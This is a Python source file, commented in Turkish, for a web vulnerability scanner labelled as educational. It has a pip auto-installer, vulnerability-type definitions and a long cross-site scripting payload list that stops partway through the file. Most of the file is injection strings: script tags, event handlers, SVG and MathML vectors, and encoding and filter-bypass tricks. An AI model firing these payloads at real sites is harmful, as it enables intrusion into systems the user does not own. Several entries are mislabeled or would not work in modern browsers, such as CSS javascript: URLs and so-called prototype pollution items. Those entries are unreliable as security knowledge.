#!/usr/bin/env python3
"""
🛡️ Gelişmiş Web Güvenlik Açığı Tarayıcısı - Eğitim Amaçlı
================================================================

Kapsamlı güvenlik testi aracı - Yetkili penetrasyon testleri ve 
güvenlik değerlendirmeleri için geliştirilmiştir.

Yapımcı: Muhammed Cengiz
Versiyon: 3.0.0
Lisans: MIT
Amaç: Eğitim ve Test

🚨 YASAL UYARI:
Bu araç sadece yetkili güvenlik testleri için tasarlanmıştır.
Kullanıcılar, herhangi bir sistemi test etmeden önce uygun 
yetkilere sahip olduklarından emin olmalıdır.
"""

import subprocess
import sys
import time
import os
from typing import List

# Gerekli kütüphaneler listesi
GEREKLI_KUTUPHANELER = [
    'requests',
    'colorama',
    'lxml',
    'urllib3',
    'tqdm',
    'tabulate',
]

class KutuphaneMduru:
    """Otomatik kütüphane yönetim sınıfı"""
    
    def __init__(self):
        self.eksik_kutuphaneler = []
        self.yuklu_kutuphaneler = []
    
    def kutuphaneleri_kontrol_et(self) -> bool:
        """Tüm gerekli kütüphaneleri kontrol eder"""
        print("🔍 Kütüphaneler kontrol ediliyor...")
        
        for kutuphane in GEREKLI_KUTUPHANELER:
            try:
                __import__(kutuphane)
                self.yuklu_kutuphaneler.append(kutuphane)
                print(f"✅ {kutuphane} - Yüklü")
            except ImportError:
                self.eksik_kutuphaneler.append(kutuphane)
                print(f"❌ {kutuphane} - Eksik")
        
        return len(self.eksik_kutuphaneler) == 0
    
    def eksik_kutuphaneleri_yukle(self) -> bool:
        """Eksik kütüphaneleri otomatik yükler"""
        if not self.eksik_kutuphaneler:
            print("✅ Tüm kütüphaneler zaten yüklü!")
            return True
        
        print(f"\n📦 {len(self.eksik_kutuphaneler)} eksik kütüphane yükleniyor...")
        
        for kutuphane in self.eksik_kutuphaneler:
            try:
                print(f"⬇️  {kutuphane} yükleniyor...")
                
                # pip ile kütüphaneyi yükle
                result = subprocess.run(
                    [sys.executable, "-m", "pip", "install", kutuphane],
                    capture_output=True,
                    text=True,
                    timeout=120
                )
                
                if result.returncode == 0:
                    print(f"✅ {kutuphane} başarıyla yüklendi!")
                else:
                    print(f"❌ {kutuphane} yüklenirken hata: {result.stderr}")
                    return False
                    
            except subprocess.TimeoutExpired:
                print(f"⏰ {kutuphane} yükleme zaman aşımı!")
                return False
            except Exception as e:
                print(f"❌ {kutuphane} yükleme hatası: {str(e)}")
                return False
            
            time.sleep(1)  # Kısa bekleme
        
        print("\n🎉 Tüm kütüphaneler başarıyla yüklendi!")
        return True
    
    def pip_guncelle(self) -> bool:
        """pip'i en son sürüme günceller"""
        try:
            print("🔄 pip güncelleniyor...")
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", "--upgrade", "pip"],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                print("✅ pip başarıyla güncellendi!")
                return True
            else:
                print(f"⚠️  pip güncelleme uyarısı: {result.stderr}")
                return True  # Genellikle kritik değil
        except Exception as e:
            print(f"❌ pip güncelleme hatası: {str(e)}")
            return True  # Devam et
    
    def otomatik_kurulum(self) -> bool:
        """Tam otomatik kütüphane kurulum süreci"""
        print("🚀 Otomatik Kütüphane Kurulum Başlatılıyor...\n")
        
        # 1. pip'i güncelle
        self.pip_guncelle()
        
        # 2. Kütüphaneleri kontrol et
        if self.kutuphaneleri_kontrol_et():
            print("\n✅ Tüm kütüphaneler hazır! Program başlatılabilir.")
            return True
        
        # 3. Eksik kütüphaneleri yükle
        print(f"\n📋 Eksik kütüphaneler: {', '.join(self.eksik_kutuphaneler)}")
        
        # Kullanıcıdan onay al
        yanit = input("\n❓ Eksik kütüphaneleri otomatik yüklemek istiyor musunuz? (e/h): ").lower()
        if yanit not in ['e', 'evet', 'y', 'yes']:
            print("❌ Kütüphane yükleme iptal edildi.")
            return False
        
        # 4. Yükleme işlemini gerçekleştir
        if self.eksik_kutuphaneleri_yukle():
            # 5. Son kontrol
            print("\n🔍 Son kontrol yapılıyor...")
            self.eksik_kutuphaneler.clear()  # Listeyi temizle
            return self.kutuphaneleri_kontrol_et()
        
        return False

def main():
    """Ana fonksiyon - sadece kütüphane yönetimi"""
    print("=" * 60)
    print("🛡️  Web Güvenlik Tarayıcısı - Kütüphane Yöneticisi")
    print("=" * 60)
    
    # Kütüphane yöneticisini başlat
    yonetici = KutuphaneMduru()
    
    if yonetici.otomatik_kurulum():
        print("\n🎯 Kütüphane kurulumu tamamlandı!")
        print("💡 Artık ana programı çalıştırabilirsiniz.")
    else:
        print("\n❌ Kütüphane kurulumu başarısız!")
        print("🔧 Lütfen manuel olarak kütüphaneleri yükleyerek tekrar deneyin.")
        sys.exit(1)

if __name__ == "__main__":
    main()

# Kütüphane importlarını try-except ile yap
try:
    import requests
    import re
    import json
    import logging
    import argparse
    from datetime import datetime
    from typing import Dict, List, Tuple, Optional
    from urllib.parse import urlparse, urljoin
    from dataclasses import dataclass
    from enum import Enum
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import threading
except ImportError as e:
    print(f"⚠️  Eksik kütüphane tespit edildi: {e}")
    print("🔄 Otomatik kurulum başlatılıyor...")
    main()
    sys.exit(0)

# Mavi tema için renk kodları
class Renkler:
    MAVI = '\033[94m'
    KOYU_MAVI = '\033[34m'
    ACIK_MAVI = '\033[96m'
    YESIL = '\033[92m'
    KIRMIZI = '\033[91m'
    SARI = '\033[93m'
    MAGENTA = '\033[95m'
    BEYAZ = '\033[97m'
    RESET = '\033[0m'
    KALIN = '\033[1m'

# Gelişmiş logging yapılandırması
logging.basicConfig(
    level=logging.INFO,
    format=f'{Renkler.ACIK_MAVI}%(asctime)s{Renkler.RESET} - {Renkler.MAVI}%(name)s{Renkler.RESET} - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('guvenlik_tarama.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class ZafiyetTipi(Enum):
    """Güvenlik açığı türleri"""
    XSS = "Cross-Site Scripting (XSS)"
    SQLI = "SQL Injection"
    CMDI = "Command Injection"
    LFI = "Local File Inclusion"
    RFI = "Remote File Inclusion"
    XXE = "XML External Entity"
    SSTI = "Server-Side Template Injection"
    LDAP = "LDAP Injection"
    XPATH = "XPath Injection"
    NOSQL = "NoSQL Injection"
    SSRF = "Server-Side Request Forgery"
    IDOR = "Insecure Direct Object Reference"
    CSRF = "Cross-Site Request Forgery"
    OPEN_REDIRECT = "Open Redirect"
    CLICKJACKING = "Clickjacking"
    FILE_UPLOAD = "Unrestricted File Upload"
    AUTH_BYPASS = "Authentication Bypass"
    MISCONFIG = "Security Misconfiguration"
    INFO_DISCLOSURE = "Information Disclosure"
    



class SiddetSeviyesi(Enum):
    """Şiddet seviyeleri"""
    DUSUK = "Düşük"
    ORTA = "Orta"
    YUKSEK = "Yüksek"
    KRITIK = "Kritik"

@dataclass
class ZafiyetSonucu:
    """Güvenlik açığı sonuç veri sınıfı"""
    zafiyet_tipi: ZafiyetTipi
    siddet: SiddetSeviyesi
    url: str
    parametre: str
    payload: str
    yanit_ornegi: str
    zaman_damgasi: datetime
    guven: float
    detay: str = ""

@dataclass
class TaramaYapilandirmasi:
    """Tarama yapılandırma veri sınıfı"""
    hedef_url: str
    parametreler: List[str]
    timeout: int = 15
    max_worker: int = 10
    istekler_arasi_gecikme: float = 0.1
    user_agent: str = "GuvenlikTarayicisi-MuhammedCengiz/3.0"
    yonlendirmeleri_takip_et: bool = True
    ssl_dogrula: bool = True
class PayloadYoneticisi:
    """Gelişmiş saldırı yükü yöneticisi"""
    
    def __init__(self):
        self.payloadlar = self._payloadlari_yukle()
    
    def _payloadlari_yukle(self) -> Dict[ZafiyetTipi, List[Dict]]:
        """Tüm güvenlik açığı türleri için kapsamlı payload koleksiyonu - 2x genişletilmiş"""
        return {
            ZafiyetTipi.XSS: [
                # Klasik XSS Payloadları
                {"payload": "<script>alert('XSS-Muhammed-Cengiz')</script>", "guven": 0.95, "aciklama": "Temel script etiketi"},
                {"payload": "\"><script>alert('XSS')</script>", "guven": 0.9, "aciklama": "Çift tırnak kaçışı"},
                {"payload": "'><script>alert('XSS')</script>", "guven": 0.9, "aciklama": "Tek tırnak kaçışı"},
                {"payload": "<svg onload=alert('XSS')>", "guven": 0.85, "aciklama": "SVG onload eventi"},
                {"payload": "<img src=x onerror=alert('XSS')>", "guven": 0.85, "aciklama": "IMG onerror eventi"},
                {"payload": "<body onload=alert('XSS')>", "guven": 0.8, "aciklama": "Body onload eventi"},
                {"payload": "<iframe src='javascript:alert(\"XSS\")'></iframe>", "guven": 0.8, "aciklama": "Iframe javascript"},
                {"payload": "javascript:alert('XSS')", "guven": 0.7, "aciklama": "Javascript pseudo protokolü"},
                {"payload": "\"><svg/onload=alert('XSS')>", "guven": 0.85, "aciklama": "Kısaltılmış SVG"},
                {"payload": "'><img src=x onerror=alert('XSS')>", "guven": 0.85, "aciklama": "IMG tek tırnak kaçışı"},
                {"payload": "<img src=x onerror=this.onerror=null;this.src='data:image/svg+xml,<svg onload=alert(1)>'/>", "guven": 0.90, "aciklama": "Recursive onerror chaining"},
                {"payload": "<svg><animate attributeName=onload values=alert(1)>", "guven": 0.89, "aciklama": "SVG animate attribute"},
                {"payload": "<svg><animateTransform attributeName=transform onbegin=alert(1)>", "guven": 0.88, "aciklama": "SVG animate transform"},
                {"payload": "<svg><set attributeName=onload to=alert(1)>", "guven": 0.87, "aciklama": "SVG set attribute"},
                {"payload": "<svg><animateMotion onbegin=alert(1)>", "guven": 0.86, "aciklama": "SVG animate motion"},
                {"payload": "<svg><foreignObject onload=alert(1)>", "guven": 0.85, "aciklama": "SVG foreign object"},
                {"payload": "<math><maction actiontype=toggle selection=1 onclick=alert(1)>", "guven": 0.84, "aciklama": "MathML action element"},
                {"payload": "<math><semantics onmouseover=alert(1)>", "guven": 0.83, "aciklama": "MathML semantics"},
                {"payload": "<math><annotation-xml onclick=alert(1)>", "guven": 0.82, "aciklama": "MathML annotation"},
                {"payload": "<math><merror onload=alert(1)>", "guven": 0.81, "aciklama": "MathML error element"},
                
                # CSS Injection Vectors
                {"payload": "<style>*{background:url(javascript:alert(1))}</style>", "guven": 0.89, "aciklama": "Universal CSS selector"},
                {"payload": "<style>@media screen{body{background:url(javascript:alert(1))}}</style>", "guven": 0.88, "aciklama": "CSS media query"},
                {"payload": "<style>@supports (background:url(javascript:alert(1))){body{background:url(javascript:alert(1))}}</style>", "guven": 0.87, "aciklama": "CSS supports query"},
                {"payload": "<style>body:before{content:url(javascript:alert(1))}</style>", "guven": 0.86, "aciklama": "CSS pseudo element"},
                {"payload": "<style>@font-face{font-family:x;src:url(javascript:alert(1))}</style>", "guven": 0.85, "aciklama": "CSS font face"},
                {"payload": "<style>@keyframes x{0%{background:url(javascript:alert(1))}}</style>", "guven": 0.84, "aciklama": "CSS keyframes"},
                {"payload": "<style>:root{--x:url(javascript:alert(1));background:var(--x)}</style>", "guven": 0.83, "aciklama": "CSS custom properties"},
                {"payload": "<style>@import url(data:text/css,body{background:url(javascript:alert(1))})</style>", "guven": 0.82, "aciklama": "CSS import data URI"},
                {"payload": "<style>body{filter:url(javascript:alert(1))}</style>", "guven": 0.81, "aciklama": "CSS filter property"},
                {"payload": "<style>body{list-style:url(javascript:alert(1))}</style>", "guven": 0.80, "aciklama": "CSS list style"},
                
                # WebComponents & Shadow DOM
                {"payload": "<template><script>alert(1)</script></template><script>document.querySelector('template').content.cloneNode(true).firstChild.textContent</script>", "guven": 0.88, "aciklama": "Template content cloning"},
                {"payload": "<slot name=x onfocus=alert(1) tabindex=0 autofocus>", "guven": 0.87, "aciklama": "Slot element focus"},
                {"payload": "<template id=x><script>alert(1)</script></template><script>document.importNode(x.content,true)</script>", "guven": 0.86, "aciklama": "Template import node"},
                {"payload": "<custom-element><script>customElements.define('custom-element',class extends HTMLElement{connectedCallback(){alert(1)}})</script>", "guven": 0.85, "aciklama": "Custom element definition"},
                {"payload": "<shadow-host><template shadowroot=open><script>alert(1)</script></template></shadow-host>", "guven": 0.84, "aciklama": "Declarative shadow DOM"},
                {"payload": "<script>customElements.whenDefined('div').then(()=>alert(1))</script>", "guven": 0.83, "aciklama": "Custom elements promise"},
                {"payload": "<autonomous-custom onclick=alert(1)><script>customElements.define('autonomous-custom',class extends HTMLElement{})</script>", "guven": 0.82, "aciklama": "Autonomous custom element"},
                {"payload": "<is-custom onclick=alert(1)><script>customElements.define('is-custom',class extends HTMLButtonElement{},{extends:'button'})</script>", "guven": 0.81, "aciklama": "Customized built-in element"},
                {"payload": "<script>new MutationObserver(()=>alert(1)).observe(document.body,{childList:true})</script><div>", "guven": 0.80, "aciklama": "Mutation observer trigger"},
                {"payload": "<script>addEventListener('DOMContentLoaded',()=>alert(1))</script>", "guven": 0.79, "aciklama": "DOM content loaded listener"},
                
                # Advanced Browser APIs
                {"payload": "<script>new BroadcastChannel('x').onmessage=()=>alert(1);new BroadcastChannel('x').postMessage('')</script>", "guven": 0.87, "aciklama": "Broadcast channel messaging"},
                {"payload": "<script>navigator.serviceWorker.register('data:application/javascript,self.oninstall=()=>alert(1)')</script>", "guven": 0.86, "aciklama": "Service worker registration"},
                {"payload": "<script>new SharedWorker('data:application/javascript,alert(1)')</script>", "guven": 0.85, "aciklama": "Shared worker creation"},
                {"payload": "<script>new Worker('data:application/javascript,postMessage(alert(1))')</script>", "guven": 0.84, "aciklama": "Web worker alert"},
                {"payload": "<script>new MessageChannel().port1.onmessage=()=>alert(1);new MessageChannel().port2.postMessage('')</script>", "guven": 0.83, "aciklama": "Message channel communication"},
                {"payload": "<script>new EventSource('data:text/event-stream,data:alert(1)').onmessage=eval</script>", "guven": 0.82, "aciklama": "Server-sent events"},
                {"payload": "<script>new WebSocket('ws://localhost').onerror=()=>alert(1)</script>", "guven": 0.81, "aciklama": "WebSocket error handler"},
                {"payload": "<script>new RTCPeerConnection().onicecandidate=()=>alert(1)</script>", "guven": 0.80, "aciklama": "WebRTC peer connection"},
                {"payload": "<script>navigator.mediaDevices.getUserMedia({video:1}).catch(()=>alert(1))</script>", "guven": 0.79, "aciklama": "Media devices error"},
                {"payload": "<script>new PerformanceObserver(()=>alert(1)).observe({entryTypes:['navigation']})</script>", "guven": 0.78, "aciklama": "Performance observer"},
                
                # Prototype Pollution Vectors
                {"payload": "<script>Object.prototype.toString=()=>alert(1);({})+''</script>", "guven": 0.86, "aciklama": "Prototype toString pollution"},
                {"payload": "<script>Array.prototype.join=()=>alert(1);[1,2].join()</script>", "guven": 0.85, "aciklama": "Array join method pollution"},
                {"payload": "<script>String.prototype.charAt=()=>alert(1);'test'.charAt(0)</script>", "guven": 0.84, "aciklama": "String charAt pollution"},
                {"payload": "<script>Number.prototype.valueOf=()=>alert(1);+new Number(1)</script>", "guven": 0.83, "aciklama": "Number valueOf pollution"},
                {"payload": "<script>Boolean.prototype.toString=()=>alert(1);true+''</script>", "guven": 0.82, "aciklama": "Boolean toString pollution"},
                {"payload": "<script>Date.prototype.getTime=()=>alert(1);new Date().getTime()</script>", "guven": 0.81, "aciklama": "Date getTime pollution"},
                {"payload": "<script>RegExp.prototype.test=()=>alert(1);/x/.test('x')</script>", "guven": 0.80, "aciklama": "RegExp test pollution"},
                {"payload": "<script>Function.prototype.call=()=>alert(1);alert.call()</script>", "guven": 0.79, "aciklama": "Function call pollution"},
                {"payload": "<script>Error.prototype.toString=()=>alert(1);new Error()+''</script>", "guven": 0.78, "aciklama": "Error toString pollution"},
                {"payload": "<script>Symbol.prototype.toString=()=>alert(1);Symbol()+''</script>", "guven": 0.77, "aciklama": "Symbol toString pollution"},
                
                # Polyglot Payloads
                {"payload": "/*<script>*/alert(1)//</script>", "guven": 0.85, "aciklama": "JavaScript/HTML polyglot"},
                {"payload": "--><script>alert(1)</script><!--", "guven": 0.84, "aciklama": "HTML comment polyglot"},
                {"payload": "</style><script>alert(1)</script><style>", "guven": 0.83, "aciklama": "CSS/JavaScript polyglot"},
                {"payload": "'><script>alert(1)</script><input type='", "guven": 0.82, "aciklama": "Attribute/JavaScript polyglot"},
                {"payload": "\"><script>alert(1)</script><textarea>", "guven": 0.81, "aciklama": "Textarea polyglot"},
                {"payload": "</title><script>alert(1)</script><title>", "guven": 0.80, "aciklama": "Title tag polyglot"},
                {"payload": "</script><script>alert(1)</script><script>", "guven": 0.79, "aciklama": "Script tag polyglot"},
                {"payload": "*/alert(1);//", "guven": 0.78, "aciklama": "Multi-line comment polyglot"},
                {"payload": "#><script>alert(1)</script>", "guven": 0.77, "aciklama": "Fragment identifier polyglot"},
                {"payload": "?><script>alert(1)</script><?", "guven": 0.76, "aciklama": "Processing instruction polyglot"},
                
                # Unicode & Encoding Bypasses
                {"payload": "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>", "guven": 0.84, "aciklama": "Unicode escape sequences"},
                {"payload": "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>", "guven": 0.83, "aciklama": "Hex escape sequences"},
                {"payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", "guven": 0.82, "aciklama": "Character code conversion"},
                {"payload": "<script>alert\\u0028\\u0031\\u0029</script>", "guven": 0.81, "aciklama": "Unicode function call"},
                {"payload": "<script>\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029</script>", "guven": 0.80, "aciklama": "Full unicode payload"},
                {"payload": "<script>eval('\\141\\154\\145\\162\\164\\50\\61\\51')</script>", "guven": 0.79, "aciklama": "Octal escape sequences"},
                {"payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "guven": 0.78, "aciklama": "Base64 encoded payload"},
                {"payload": "<script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))</script>", "guven": 0.77, "aciklama": "URL encoded payload"},
                {"payload": "<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>", "guven": 0.76, "aciklama": "Unescape encoded payload"},
                {"payload": "<script>eval('ale'+'rt(1)')</script>", "guven": 0.75, "aciklama": "String concatenation"},
                
                # Advanced SVG Vectors
                {"payload": "<svg><script xlink:href=data:,alert(1) />", "guven": 0.83, "aciklama": "SVG xlink href script"},
                {"payload": "<svg><use xlink:href=data:image/svg+xml,<svg><script>alert(1)</script></svg>#x />", "guven": 0.82, "aciklama": "SVG use element"},
                {"payload": "<svg><feImage xlink:href=javascript:alert(1) />", "guven": 0.81, "aciklama": "SVG feImage filter"},
                {"payload": "<svg><image xlink:href=javascript:alert(1) />", "guven": 0.80, "aciklama": "SVG image element"},
                {"payload": "<svg><animation xlink:href=javascript:alert(1) />", "guven": 0.79, "aciklama": "SVG animation element"},
                {"payload": "<svg><textPath xlink:href=javascript:alert(1) />", "guven": 0.78, "aciklama": "SVG textPath element"},
                {"payload": "<svg><pattern xlink:href=javascript:alert(1) />", "guven": 0.77, "aciklama": "SVG pattern element"},
                {"payload": "<svg><marker xlink:href=javascript:alert(1) />", "guven": 0.76, "aciklama": "SVG marker element"},
                {"payload": "<svg><clipPath xlink:href=javascript:alert(1) />", "guven": 0.75, "aciklama": "SVG clipPath element"},
                {"payload": "<svg><mask xlink:href=javascript:alert(1) />", "guven": 0.74, "aciklama": "SVG mask element"},
                
                # Meta Tag Vectors
                {"payload": "<meta http-equiv=set-cookie content=alert(1)>", "guven": 0.82, "aciklama": "Meta set-cookie injection"},
                {"payload": "<meta name=viewport content=width=device-width,initial-scale=1 onload=alert(1)>", "guven": 0.81, "aciklama": "Meta viewport injection"},
                {"payload": "<meta property=og:image content=javascript:alert(1)>", "guven": 0.80, "aciklama": "Meta Open Graph injection"},
                {"payload": "<meta name=twitter:image content=javascript:alert(1)>", "guven": 0.79, "aciklama": "Meta Twitter card injection"},
                {"payload": "<meta name=description content=javascript:alert(1) onload=alert(1)>", "guven": 0.78, "aciklama": "Meta description injection"},
                {"payload": "<meta name=keywords content=javascript:alert(1) onclick=alert(1)>", "guven": 0.77, "aciklama": "Meta keywords injection"},
                {"payload": "<meta name=author content=javascript:alert(1) onerror=alert(1)>", "guven": 0.76, "aciklama": "Meta author injection"},
                {"payload": "<meta name=generator content=javascript:alert(1) onfocus=alert(1)>", "guven": 0.75, "aciklama": "Meta generator injection"},
                {"payload": "<meta name=application-name content=javascript:alert(1)>", "guven": 0.74, "aciklama": "Meta application name injection"},
                
                # Form Element Vectors
                {"payload": "<form><input name=action value=javascript:alert(1)><input type=submit>", "guven": 0.81, "aciklama": "Form input name override"},
                {"payload": "<form><input name=method value=post><input name=action value=javascript:alert(1)><input type=submit>", "guven": 0.80, "aciklama": "Form method override"},
                {"payload": "<form><button formaction=javascript:alert(1)>Submit</button>", "guven": 0.79, "aciklama": "Button formaction attribute"},
                {"payload": "<form><input type=image src=x onerror=alert(1) formaction=javascript:alert(1)>", "guven": 0.78, "aciklama": "Input image formaction"},
                {"payload": "<form><input type=submit formmethod=get formaction=javascript:alert(1)>", "guven": 0.77, "aciklama": "Submit formmethod override"},
                {"payload": "<form><fieldset form=x><input type=submit formaction=javascript:alert(1)></fieldset>", "guven": 0.76, "aciklama": "Fieldset form association"},
                {"payload": "<form><label for=x onclick=alert(1)><input id=x></label>", "guven": 0.75, "aciklama": "Label for attribute"},
                {"payload": "<form><output for=x onclick=alert(1)><input id=x></output>", "guven": 0.74, "aciklama": "Output for attribute"},
                {"payload": "<form><datalist id=x><option onclick=alert(1)></datalist><input list=x>", "guven": 0.73, "aciklama": "Datalist option injection"},
                {"payload": "<form><meter onclick=alert(1) value=0.5>", "guven": 0.72, "aciklama": "Meter element injection"},
                
                # CSS Animation Vectors
                {"payload": "<style>@keyframes x{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}body{animation:x 1s}body:hover{background:url(javascript:alert(1))}</style>", "guven": 0.80, "aciklama": "CSS animation hover trigger"},
                {"payload": "<style>body{transition:all 1s;background:red}body:hover{background:url(javascript:alert(1))}</style>", "guven": 0.79, "aciklama": "CSS transition trigger"},
                {"payload": "<style>@media (hover:hover){body:hover{background:url(javascript:alert(1))}}</style>", "guven": 0.78, "aciklama": "CSS media hover query"},
                {"payload": "<style>@supports (display:flex){body{background:url(javascript:alert(1))}}</style>", "guven": 0.77, "aciklama": "CSS supports feature query"},
                {"payload": "<style>body{background:linear-gradient(to right,transparent,url(javascript:alert(1)))}</style>", "guven": 0.76, "aciklama": "CSS gradient injection"},
                {"payload": "<style>body{background:radial-gradient(circle,transparent,url(javascript:alert(1)))}</style>", "guven": 0.75, "aciklama": "CSS radial gradient"},
                {"payload": "<style>body{background:conic-gradient(from 0deg,transparent,url(javascript:alert(1)))}</style>", "guven": 0.74, "aciklama": "CSS conic gradient"},
                {"payload": "<style>body{mask:url(javascript:alert(1))}</style>", "guven": 0.73, "aciklama": "CSS mask property"},
                {"payload": "<style>body{clip-path:url(javascript:alert(1))}</style>", "guven": 0.72, "aciklama": "CSS clip-path property"},
                {"payload": "<style>body{shape-outside:url(javascript:alert(1))}</style>", "guven": 0.71, "aciklama": "CSS shape-outside property"},
                
                # WebGL & Canvas Vectors
                {"payload": "<script>const c=document.createElement('canvas');const gl=c.getContext('webgl');gl.shaderSource(gl.createShader(gl.VERTEX_SHADER),'void main(){alert(1);}')</script>", "guven": 0.79, "aciklama": "WebGL shader injection"},
                {"payload": "<script>const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.font='1px x';ctx.fillText('',0,0);alert(1)</script>", "guven": 0.78, "aciklama": "Canvas 2D context injection"},
                {"payload": "<script>const c=document.createElement('canvas');c.toBlob(()=>alert(1))</script>", "guven": 0.77, "aciklama": "Canvas toBlob callback"},
                {"payload": "<script>const c=document.createElement('canvas');c.toDataURL();alert(1)</script>", "guven": 0.76, "aciklama": "Canvas toDataURL execution"},
                {"payload": "<script>const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.createImageData(1,1);alert(1)</script>", "guven": 0.75, "aciklama": "Canvas createImageData"},
                {"payload": "<script>const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.getImageData(0,0,1,1);alert(1)</script>", "guven": 0.74, "aciklama": "Canvas getImageData"},
                {"payload": "<script>const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.putImageData(ctx.createImageData(1,1),0,0);alert(1)</script>", "guven": 0.73, "aciklama": "Canvas putImageData"},
                {"payload": "<script>const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.drawImage(new Image(),0,0);alert(1)</script>", "guven": 0.72, "aciklama": "Canvas drawImage"},
                {"payload": "<script>const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.createPattern(c,'repeat');alert(1)</script>", "guven": 0.71, "aciklama": "Canvas createPattern"},
                {"payload": "<script>const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.createLinearGradient(0,0,1,1);alert(1)</script>", "guven": 0.70, "aciklama": "Canvas linear gradient"},
                
                # Ek Klasik XSS Payloadları
                {"payload": "<script>confirm('XSS-Test')</script>", "guven": 0.95, "aciklama": "Confirm dialog box"},
                {"payload": "<script>prompt('XSS','Test')</script>", "guven": 0.9, "aciklama": "Prompt dialog box"},
                {"payload": "<div onmouseover=alert('XSS')>Hover</div>", "guven": 0.8, "aciklama": "Div onmouseover eventi"},
                {"payload": "<button onclick=alert('XSS')>Click</button>", "guven": 0.85, "aciklama": "Button onclick eventi"},
                {"payload": "<link rel=stylesheet href=javascript:alert('XSS')>", "guven": 0.75, "aciklama": "Link javascript href"},
                {"payload": "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>", "guven": 0.8, "aciklama": "Meta refresh javascript"},
                {"payload": "<table background=javascript:alert('XSS')>", "guven": 0.7, "aciklama": "Table background javascript"},
                {"payload": "<form action=javascript:alert('XSS')><input type=submit>", "guven": 0.75, "aciklama": "Form action javascript"},
                {"payload": "<object data=javascript:alert('XSS')>", "guven": 0.8, "aciklama": "Object data javascript"},
                {"payload": "<embed src=javascript:alert('XSS')>", "guven": 0.8, "aciklama": "Embed src javascript"},
                
                # Gelişmiş XSS Payloadları
                {"payload": "<script>alert(String.fromCharCode(88,83,83))</script>", "guven": 0.9, "aciklama": "Karakter kodlaması ile gizleme"},
                {"payload": "<math><mtext></mtext><script>alert(1)</script></math>", "guven": 0.85, "aciklama": "Math etiketi kullanımı"},
                {"payload": "<details open ontoggle=alert('XSS')>", "guven": 0.8, "aciklama": "Details ontoggle eventi"},
                {"payload": "<video><source onerror='alert(1)'></video>", "guven": 0.8, "aciklama": "Video source onerror"},
                {"payload": "<input autofocus onfocus=alert(1)>", "guven": 0.75, "aciklama": "Input autofocus"},
                {"payload": "<select onfocus=alert(1) autofocus>", "guven": 0.75, "aciklama": "Select onfocus"},
                {"payload": "<textarea onfocus=alert(1) autofocus>", "guven": 0.75, "aciklama": "Textarea onfocus"},
                {"payload": "<keygen onfocus=alert(1) autofocus>", "guven": 0.7, "aciklama": "Keygen onfocus"},
                {"payload": "<marquee onstart=alert(1)>", "guven": 0.7, "aciklama": "Marquee onstart"},
                {"payload": "<audio src=x onerror=alert(1)>", "guven": 0.8, "aciklama": "Audio onerror"},
                
                # Ek Gelişmiş XSS Payloadları
                {"payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", "guven": 0.9, "aciklama": "Eval ile karakter kodlaması"},
                {"payload": "<style>@import'javascript:alert(\"XSS\")';</style>", "guven": 0.8, "aciklama": "CSS import javascript"},
                {"payload": "<script>setTimeout('alert(\"XSS\")',1000)</script>", "guven": 0.85, "aciklama": "SetTimeout gecikmeli alert"},
                {"payload": "<script>setInterval('alert(\"XSS\")',5000)</script>", "guven": 0.8, "aciklama": "SetInterval periyodik alert"},
                {"payload": "<canvas onmouseover=alert('XSS')>", "guven": 0.75, "aciklama": "Canvas onmouseover"},
                {"payload": "<dialog open onclose=alert('XSS')>", "guven": 0.7, "aciklama": "Dialog onclose eventi"},
                {"payload": "<menu type=context onshow=alert('XSS')>", "guven": 0.7, "aciklama": "Menu onshow eventi"},
                {"payload": "<datalist><option onselect=alert('XSS')>", "guven": 0.7, "aciklama": "Datalist option onselect"},
                {"payload": "<output onclick=alert('XSS')>Output</output>", "guven": 0.75, "aciklama": "Output onclick"},
                {"payload": "<progress onclick=alert('XSS') value=50 max=100>", "guven": 0.75, "aciklama": "Progress onclick"},
                
                # Bypass Teknikleri
                {"payload": "<ScRiPt>alert('XSS')</ScRiPt>", "guven": 0.8, "aciklama": "Büyük/küçük harf bypass"},
                {"payload": "<script\x20type=\"text/javascript\">alert('XSS')</script>", "guven": 0.8, "aciklama": "Hex kodlama"},
                {"payload": "<script\x3Ealert('XSS')</script>", "guven": 0.8, "aciklama": "Hex > karakteri"},
                {"payload": "<script\x0Aalert('XSS')</script>", "guven": 0.8, "aciklama": "Newline bypass"},
                {"payload": "<script\x0Dalert('XSS')</script>", "guven": 0.8, "aciklama": "Carriage return bypass"},
                {"payload": "<script\x09alert('XSS')</script>", "guven": 0.8, "aciklama": "Tab bypass"},
                {"payload": "<script\x0Calert('XSS')</script>", "guven": 0.8, "aciklama": "Form feed bypass"},
                {"payload": "<<SCRIPT>alert('XSS');//<</SCRIPT>", "guven": 0.75, "aciklama": "Çift bracket bypass"},
                {"payload": "<script>a=/XSS/;alert(a.source)</script>", "guven": 0.8, "aciklama": "Regex bypass"},
                {"payload": "<object data=\"javascript:alert('XSS')\">", "guven": 0.75, "aciklama": "Object data javascript"},
                
                # Ek Bypass Teknikleri
                {"payload": "<sc<script>ript>alert('XSS')</script>", "guven": 0.8, "aciklama": "Nested tag bypass"},
                {"payload": "<script src=data:text/javascript,alert('XSS')>", "guven": 0.85, "aciklama": "Data URI script src"},
                {"payload": "<svg><script>alert('XSS')</script></svg>", "guven": 0.85, "aciklama": "SVG script wrapper"},
